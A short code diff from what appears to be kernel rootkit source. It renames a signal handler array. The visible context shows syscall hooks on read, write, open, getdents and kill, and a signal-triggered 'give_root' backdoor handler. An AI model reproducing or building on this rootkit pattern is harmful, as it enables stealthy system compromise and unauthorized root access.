@@ -37,7 +37,7 @@ INIT_HOOK_HANDLERS(P_SYSCALL_HOOKS, read, write, open, pread64, sendfile, getden
                    getpid, kill)
 
 // Define signal handler array
-signal_handler_t p_signal_hooks[] = {
+signal_handler_t p_sig_handlers[] = {
     NEW_SIGNAL_HANDLER(-1, SIGNAL_ROOT, give_root),
 };
 
